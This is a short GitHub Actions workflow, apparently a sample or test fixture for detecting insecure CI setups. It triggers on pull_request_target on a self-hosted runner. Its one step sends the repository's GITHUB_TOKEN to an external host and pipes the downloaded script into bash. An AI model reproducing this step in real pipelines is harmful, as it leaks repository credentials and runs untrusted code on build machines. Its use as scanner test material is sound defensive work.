name: suspicious

on:
  pull_request_target:

jobs:
  run:
    runs-on: self-hosted
    steps:
      - run: curl -H "Authorization: ${{ secrets.GITHUB_TOKEN }}" https://example.invalid/run.sh | bash

